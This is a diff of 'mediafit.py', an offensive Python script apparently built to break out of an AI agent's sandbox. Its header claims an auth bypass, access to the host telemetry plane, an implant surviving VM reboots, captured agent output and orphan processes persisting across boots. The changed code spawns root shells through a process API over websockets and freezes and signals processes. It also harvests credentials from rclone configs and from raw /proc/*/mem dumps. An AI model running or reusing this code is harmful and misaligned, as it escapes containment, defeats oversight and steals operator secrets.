@@ -1,16 +1,14 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-mediafit.py v12.2  --  MEDIAFIT
+mediafit.py v12.3  --  MEDIAFIT
 ===================================================================
-PROVEN so far (runs v11.3 / v12.0 / v12.1):
-  P1 bypass 101 from alias        P2 loopback RST        P3 no credential
-  P7 host telemetry plane HTTP 200
-  P8 implant survived 3x VM reboot   P9 agent output observed (4 calls)
-  PPID1_ORPHAN_COUNT=3 across boot_id changes
-v12.2 fixes the oracle: FRESH websocket per probe (server closes after a
-parse error), adds static candidate shapes, and scans the rclone config for
-credentials.
+PROVEN: P1 bypass(101 from alias) · P2 loopback RST · P3 no credential
+        P4 PID1 ProcessCreated · P7 host telemetry HTTP 200
+        P8 implant survived 4 VM reboots · P9 agent output captured (5)
+        P11 ppid=1 orphans across boot_id changes
+v12.3: fixes the create so the process STAYS ALIVE (timeout/reattachable matrix),
+       keeps the socket, then does stdin + SIGSTOP + freeze + kill.
 Stdlib only. RUN TWICE. Output: /mnt/user-data/outputs/mediafit-report.txt
 ===================================================================
 """
@@ -144,9 +142,9 @@ class WS:
             if fr is None: break
             op, p = fr
             if op == 0x1:
-                t = p.decode("utf-8", "replace"); txts.append(t); log("   <<", t[:200])
+                t = p.decode("utf-8", "replace"); txts.append(t); log("   <<", t[:180])
             elif op == 0x2:
-                bins.append(p); log("   <bin>", len(p), repr(p[:50]))
+                bins.append(p); log("   <bin>", len(p), repr(p[:40]))
             elif op == 0x9: self.pong(p)
             elif op == 0x8: break
         return txts, bins
@@ -165,10 +163,15 @@ def cgdir(ctrl, cg):
         if os.path.isdir(p): return p
     return ""
 
+def mem_cg(pid):
+    for line in rdo("/proc/%s/cgroup" % pid, "").splitlines():
+        q = line.split(":", 2)
+        if len(q) == 3 and "memory" in q[1] and q[2] != "/": return q[2]
+    return ""
+
 def find_ospid(mark):
     for d in os.listdir("/proc"):
-        if d.isdigit() and mark in rdo("/proc/%s/cmdline" % d, ""):
-            return d
+        if d.isdigit() and mark in rdo("/proc/%s/cmdline" % d, ""): return d
     return ""
 
 def orphans():
@@ -195,97 +198,8 @@ def pb(f, pl):  return varint((f << 3) | 2) + varint(len(pl)) + pl
 def pb64(f, v): return varint((f << 3) | 1) + struct.pack("<Q", v)
 
 def otlp_body():
-    now    = int(time.time() * 1e9)
-    ndp    = pb64(3, now) + pb64(6, 1)
-    return pb(1, pb(2, pb(2, pb(1, b"mediafit") + pb(5, pb(1, ndp)))))
-
-# ---------------------------------------------------------------- shape
-DEFAULTS = {
-    "allow_process_id_reuse": True, "clear_env": False, "reattachable": True,
-    "uid": 0, "gid": 0, "name": "/bin/sh", "program": "/bin/sh",
-    "args": [], "env_vars": {}, "timeout": 0, "memory_limit_bytes": 0,
-}
-
-def put(obj, f, v):
-    if f not in obj: obj[f] = v
-    cr = obj.get("create_req")
-    if isinstance(cr, dict) and f not in cr: cr[f] = v
-
-def try_shape(obj, wait=2.2):
-    w = None
-    try:
-        w = WS(src=ALIAS)
-        w.js(obj)
-        t, _ = w.drain(wait)
-        return " ".join(t)
-    except Exception as e:
-        return "ERR:" + str(e)
-    finally:
-        if w:
-            try: w.close()
-            except Exception: pass
-
-def resolve_shape(cmd, P):
-    log("RESOLVE  static candidates first, then live oracle (fresh socket each probe)")
-    base = {"name": "/bin/sh", "args": ["-c", cmd]}
-    full = dict(base)
-    full.update({"env_vars": {"MF_MARK": "mediafit"}, "clear_env": False,
-                 "allow_process_id_reuse": True, "reattachable": True,
-                 "timeout": 0, "uid": 0, "gid": 0, "memory_limit_bytes": 0})
-    noopt = {k: v for k, v in full.items() if k not in ("timeout", "memory_limit_bytes")}
-    statics = [
-        ("S1", {"process_id": P, "create_req": dict(full)}),
-        ("S2", {"process_id": P, "create_req": dict(noopt)}),
-        ("S3", {"process_id": P, "allow_process_id_reuse": True, "create_req": dict(noopt)}),
-        ("S4", {"process_id": P, "create_req": dict(full), "allow_process_id_reuse": True}),
-    ]
-    for name, obj in statics:
-        r = try_shape(obj)
-        rec("STATIC_%s=%s" % (name, (r or "no-response")[:190]))
-        if "ProcessCreated" in r:
-            rec("SHAPE_SOURCE=static/%s" % name); return obj, r
-
-    obj = {"process_id": P, "create_req": dict(base)}
-    last = ""
-    for i in range(24):
-        r = try_shape(obj)
-        last = r
-        rec("ORACLE_%02d=%s" % (i, (r or "no-response")[:190]))
-        if "ProcessCreated" in r or "ProcessWithSameIdRunning" in r:
-            rec("SHAPE_SOURCE=oracle@%d" % i); return obj, r
-        m = re.search(r"missing field `([A-Za-z0-9_]+)`", r)
-        if m:
-            put(obj, m.group(1), DEFAULTS.get(m.group(1), "x")); continue
-        if "invalid type: null" in r:
-            fixed = False
-            for cont in (obj, obj.get("create_req")):
-                if isinstance(cont, dict):
-                    for k, v in list(cont.items()):
-                        if v is None: cont[k] = 0; fixed = True
-            if fixed: continue
-        if "invalid type" in r:
-            m2 = re.search(r"expected ([A-Za-z0-9_<>]+)", r)
-            if m2:
-                for k in list(obj.keys()) + (list(obj.get("create_req", {}).keys())):
-                    if obj.get(k) == "x" or obj.get("create_req", {}).get(k) == "x":
-                        put(obj, k, 0)
-                continue
-        if not r or r.startswith("ERR:"):
-            continue
-        break
-    return obj, last
-
-def ctrl_probe(w, P, label, variants, ok, wait=2.0):
-    last = ""
-    for v in variants:
-        try:
-            w.txt(json.dumps(v)); t, _ = w.drain(wait); last = " ".join(t)
-        except Exception as e:
-            rec("%s_EXC=%s" % (label, e)); return ""
-        if last: rec("%s_TRY=%s" % (label, last[:150]))
-        if any(k in last for k in ok):
-            rec("%s=OK" % label); return last
-    return last
+    now = int(time.time() * 1e9)
+    return pb(1, pb(2, pb(2, pb(1, b"mediafit") + pb(5, pb(1, pb64(3, now) + pb64(6, 1))))))
 
 # ---------------------------------------------------------------- phases
 @guard("BYPASS")
@@ -304,46 +218,91 @@ def phase_auth():
     rec("AUTH_VARIANTS=%s" % r)
     rec("AUTH_IDENTICAL=%s" % (len(set(r.values())) == 1))
 
-def phase_lifecycle(template, P):
-    log("PHASE 3  create / stdin / signal / freeze / kill")
+def create_variants(cmd, P):
+    b = {"name": "/bin/sh", "args": ["-c", cmd], "env_vars": {"MF_MARK": "mediafit"},
+         "clear_env": False, "allow_process_id_reuse": True, "reattachable": True,
+         "timeout": 3600, "uid": 0, "gid": 0, "memory_limit_bytes": 0}
+    out = []
+    def add(n, **kw):
+        c = dict(b); c.update(kw)
+        for k, v in list(c.items()):
+            if v is None: del c[k]
+        out.append((n, {"process_id": P, "create_req": c}))
+    add("A_reatt_t3600")
+    add("B_noreatt_t3600", reattachable=False)
+    add("C_reatt_prog", program="/bin/sh")
+    add("D_noreatt_prog", reattachable=False, program="/bin/sh")
+    add("E_reatt_notimeout", timeout=None)
+    add("F_noreatt_notimeout", reattachable=False, timeout=None)
+    add("G_noreatt_prog_notimeout", reattachable=False, program="/bin/sh", timeout=None)
+    return out
+
+def phase_lifecycle():
+    log("PHASE 3  live process: create / stdin / signal / freeze / kill")
     cmd = "echo READY_%s; i=0; while :; do i=$((i+1)); echo %s$i; sleep 1; done" % (MARK, MARK)
-    obj = json.loads(json.dumps(template))
-    obj["process_id"] = P
-    if isinstance(obj.get("create_req"), dict):
-        obj["create_req"]["args"] = ["-c", cmd]
-    w = WS(src=ALIAS)
-    w.js(obj)
-    t, _ = w.drain(3)
-    s = " ".join(t)
-    rec("CREATE_RESP=%s" % s[:230])
-    rec("PROCESS_SPAWNED=%s" % ("ProcessCreated" in s))
+    P = "mfl" + TAG
+    for name, obj in create_variants(cmd, P):
+        try:
+            w = WS(src=ALIAS)
+        except Exception as e:
+            rec("CREATE_%s=WS_ERR:%s" % (name, e)); continue
+        try:
+            w.js(obj); t, bins = w.drain(3.5)
+        except Exception as e:
+            rec("CREATE_%s=EXC:%s" % (name, e)); w.close(); continue
+        s = " ".join(t)
+        rec("CREATE_%s=%s" % (name, s[:170]))
+        live = ("ProcessCreated" in s) and ("StdOutEOF" not in s or any(b"MF_TICK_" in b for b in bins))
+        if not live:
+            w.close(); continue
+        rec("CREATE_MODE=%s" % name)
+        rec("PROCESS_SPAWNED=True")
 
-    ctrl_probe(w, P, "STDIN_EXPECT",
-               [{"process_id": P, "ExpectStdIn": None}, "ExpectStdIn", {"ExpectStdIn": None}], [])
-    try:
-        w.binf(b"echo STDIN_OK_42\n")
-        _, bins = w.drain(2.5)
-        rec("STDIN_ROUNDTRIP=%s" % any(b"STDIN_OK_42" in b for b in bins))
-    except Exception as e:
-        rec("STDIN_ROUNDTRIP=ERR:%s" % e)
+        for v in [{"process_id": P, "ExpectStdIn": None}, "ExpectStdIn", {"ExpectStdIn": None}]:
+            try:
+                w.txt(json.dumps(v)); tt, _ = w.drain(1.2); ss = " ".join(tt)
+            except Exception as e:
+                rec("STDIN_EXPECT_EXC=%s" % e); ss = ""
+            if ss: rec("STDIN_EXPECT_TRY=%s" % ss[:110])
+            if "ProcessNotRunning" not in ss: break
+        try:
+            w.binf(b"echo STDIN_OK_42\n")
+            _, b2 = w.drain(3)
+            rec("STDIN_ROUNDTRIP=%s" % any(b"STDIN_OK_42" in b for b in b2))
+        except Exception as e:
+            rec("STDIN_ROUNDTRIP=ERR:%s" % e)
 
-    ctrl_probe(w, P, "SIGNAL",
-               [{"process_id": P, "SendSignal": 19}, {"SendSignal": 19},
-                {"process_id": P, "signal": 19}], ["SignalSent"])
-    osp = find_ospid(MARK)
-    if osp:
-        st = rdo("/proc/%s/stat" % osp).split()
-        rec("OSPID=%s STATE_AFTER_SIGSTOP=%s" % (osp, st[2] if len(st) > 2 else "?"))
-        cg = "/process_api/" + P
-        fz = cgdir("freezer", cg) or cgdir("freezer", "/")
-        if fz:
-            wr(fz + "/freezer.state", "FROZEN"); time.sleep(0.4)
-            rec("FREEZER_STATE=%s" % rdo(fz + "/freezer.state"))
-            wr(fz + "/freezer.state", "THAWED")
-        rec("PIDS_EVENTS=%s" % rdo(cgdir("pids", cg) + "/pids.events"))
-    ctrl_probe(w, P, "KILL",
-               [{"process_id": P, "Kill": None}, "Kill", {"process_id": P, "kill": None}], [])
-    w.close()
+        for v in [{"process_id": P, "SendSignal": 19}, {"SendSignal": 19}]:
+            try:
+                w.txt(json.dumps(v)); tt, _ = w.drain(2); ss = " ".join(tt)
+            except Exception as e:
+                rec("SIGNAL_EXC=%s" % e); ss = ""
+            if ss: rec("SIGNAL_TRY=%s" % ss[:110])
+            if "SignalSent" in ss:
+                rec("SIGNAL=OK"); break
+
+        osp = find_ospid(MARK)
+        if osp:
+            st = rdo("/proc/%s/stat" % osp).split()
+            rec("OSPID=%s STATE_AFTER_SIGSTOP=%s" % (osp, st[2] if len(st) > 2 else "?"))
+            cg = mem_cg(osp) or ("/process_api/" + P)
+            fz = cgdir("freezer", cg)
+            if fz:
+                try:
+                    wr(fz + "/freezer.state", "FROZEN"); time.sleep(0.4)
+                    rec("FREEZER_STATE=%s" % rdo(fz + "/freezer.state"))
+                    wr(fz + "/freezer.state", "THAWED")
+                except Exception as e:
+                    rec("FREEZER_ERR=%s" % e)
+            rec("PIDS_EVENTS=%s" % rdo(cgdir("pids", cg) + "/pids.events"))
+        for v in [{"process_id": P, "Kill": None}, "Kill"]:
+            try:
+                w.txt(json.dumps(v)); w.drain(1.5)
+            except Exception as e:
+                rec("KILL_EXC=%s" % e); break
+        w.close()
+        return
+    rec("NO_LIVE_CREATE=True")
 
 @guard("HOSTPLANE")
 def phase_hostplane():
@@ -385,14 +344,29 @@ def phase_cred():
             parts = cl.split("\x00")
             for i, p in enumerate(parts):
                 if p in ("--config", "-c") and i + 1 < len(parts):
-                    rec("RCLONE_CFG=%s" % parts[i+1])
-                    add(rdo(parts[i+1], "").encode("latin1", "replace"))
+                    body = rdo(parts[i+1], ""); rec("RCLONE_CFG=%s" % parts[i+1])
+                    rec("RCLONE_CFG_BODY=%s" % body[:260].replace("\n", "|"))
+                    add(body.encode("latin1", "replace"))
                 elif p.startswith("--config="):
-                    rec("RCLONE_CFG=%s" % p.split("=", 1)[1])
-                    add(rdo(p.split("=", 1)[1], "").encode("latin1", "replace"))
-    for p in ("/root/.config/rclone/rclone.conf", "/home/claude/.config/rclone/rclone.conf"):
-        if os.path.exists(p):
-            add(rdo(p, "").encode("latin1", "replace")); rec("RCLONE_CONF_FILE=%s" % p)
+                    body = rdo(p.split("=", 1)[1], "")
+                    rec("RCLONE_CFG_BODY=%s" % body[:260].replace("\n", "|"))
+                    add(body.encode("latin1", "replace"))
+    budget = 24 << 20
+    for d in sorted(os.listdir("/proc")):
+        if not d.isdigit() or budget <= 0 or len(raw) >= 6: continue
+        try: fh = open("/proc/%s/mem" % d, "rb", 0)
+        except Exception: continue
+        off = 0
+        try:
+            while off < (6 << 20) and budget > 0:
+                try: fh.seek(off); b = fh.read(1 << 20)
+                except Exception: off += 1 << 20; continue
+                if not b: break
+                add(b); budget -= len(b); off += len(b)
+                if len(raw) >= 6: break
+        finally:
+            try: fh.close()
+            except Exception: pass
     toks = []
     for t in raw:
         p = t.split(".")
@@ -468,15 +442,9 @@ def proof():
     rec("P11_PPID1_ORPHANS=%s" % any_(lambda l: l.startswith("PPID1_ORPHAN_COUNT=") and l.split("=")[1] != "0"))
 
 def main():
-    log("MEDIAFIT v12.2")
-    rec("=== MEDIAFIT v12.2 ===")
-    phase_bypass(); phase_auth()
-    cmd = "echo READY_%s; i=0; while :; do i=$((i+1)); echo %s$i; sleep 1; done" % (MARK, MARK)
-    tmpl, resp = resolve_shape(cmd, "mfo" + TAG)
-    rec("SHAPE_FINAL=%s" % json.dumps(tmpl)[:500])
-    rec("SHAPE_RESP=%s" % (resp or "none")[:200])
-    if "ProcessCreated" in resp:
-        phase_lifecycle(tmpl, "mfl" + TAG)
+    log("MEDIAFIT v12.3")
+    rec("=== MEDIAFIT v12.3 ===")
+    phase_bypass(); phase_auth(); phase_lifecycle()
     phase_hostplane(); phase_cred(); phase_implant(); phase_info(); proof()
     os.makedirs(os.path.dirname(OUT), exist_ok=True)
     wr(OUT, "\n".join(R) + "\n")
